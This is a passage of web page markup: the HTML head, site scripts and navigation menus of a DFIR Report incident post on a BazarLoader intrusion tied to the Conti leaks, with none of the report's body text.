<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>BazarLoader and the Conti Leaks &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="a03df4888b9b541f3483938f-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/14.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.7.1' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/14.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/14.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="a03df4888b9b541f3483938f-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/p/jetpack/14.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/4173" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=4173' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2021%2F10%2F04%2Fbazarloader-and-the-conti-leaks%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2021%2F10%2F04%2Fbazarloader-and-the-conti-leaks%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="a03df4888b9b541f3483938f-text/javascript"></script>
		<script type="a03df4888b9b541f3483938f-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="a03df4888b9b541f3483938f-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=0F3948D2F571692DC1C53EAEFAE9219E');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="BazarLoader and the Conti Leaks" />
<meta property="og:url" content="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/" />
<meta property="og:description" content="Intro In July, we observed an intrusion that started from a BazarLoader infection and lasted approximately three days. The threat actor&#8217;s main priority was to map the domain network, while lo…" />
<meta property="article:published_time" content="2021-10-04T01:30:53+00:00" />
<meta property="article:modified_time" content="2021-10-04T14:39:12+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2021/09/ProcessInjection-Diagram-small.png" />
<meta property="og:image:width" content="2000" />
<meta property="og:image:height" content="827" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="BazarLoader and the Conti Leaks" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2021/09/ProcessInjection-Diagram-small.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-4173 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
